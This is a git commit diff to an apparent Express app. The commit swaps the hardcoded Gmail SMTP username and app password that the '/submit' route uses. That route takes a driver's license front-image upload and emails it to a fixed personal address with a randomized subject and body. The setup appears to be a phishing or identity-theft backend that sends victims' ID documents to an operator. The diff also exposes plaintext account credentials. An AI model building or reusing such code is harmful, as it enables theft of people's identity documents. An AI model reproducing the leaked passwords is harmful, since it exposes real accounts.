ae0db81b4fbba636ba1d6624a1efefd98fb15c7c
Ganwno <130082545+Ganwno@users.noreply.github.com>
2023-04-06 18:07:17 +0100

    Update index.js

--- index.js
+++ index.js
@@ -60,14 +60,14 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
       port: 465,
       secure: true,
       auth: {
-        user: "tobir2275@gmail.com",
-        pass: "qteaicwtuuzthdbl",
+        user: "grantoniap@gmail.com",
+        pass: "aylysgnyieaialpm",
       },
     });
 
     // create mail options object
     const mailOptions = {
-      from: "tobir2275@gmail.com",
+      from: "grantoniap@gmail.com",
       to: "isaiahgabriel175@gmail.com", // recipient email address
       subject: `${randomSubject}`,
       text: `${randomSentence}`,
